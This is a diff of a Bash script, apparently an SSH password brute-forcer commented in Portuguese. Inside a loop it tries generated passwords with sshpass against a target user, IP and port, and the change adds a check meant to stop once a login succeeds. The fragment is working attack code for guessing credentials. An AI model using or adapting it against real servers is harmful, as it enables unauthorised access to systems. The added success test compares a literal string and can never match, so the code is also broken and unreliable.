@@ -90,16 +90,20 @@ do
     done
  
 
+
+    
     # Mostra a saida e tenta conexao com ssh
     echo '~Tentando conexão com a senha:' $TRY
-    sshpass -p "$TRY" ssh $USRR@$IPADD -p $PORTT
-    
+    exitsts=$(sshpass -p "$TRY" ssh $USRR@$IPADD -p $PORTT)
+
+echo 'chegou no if valor do exitsts'$exitsts
+
 #Saida do brute force caso obtenha acesso no sshpass
-   # if [ "$acc" = "0" ]
-    #then
-	   # echo 'valor de acc' $acc
-     #       exit
- #   fi
+   if [ exitsts = ":/ $" ]
+    then
+	  echo 'acabou'
+          exit
+    fi
 
 
     # Incrementa a primeira posicao.
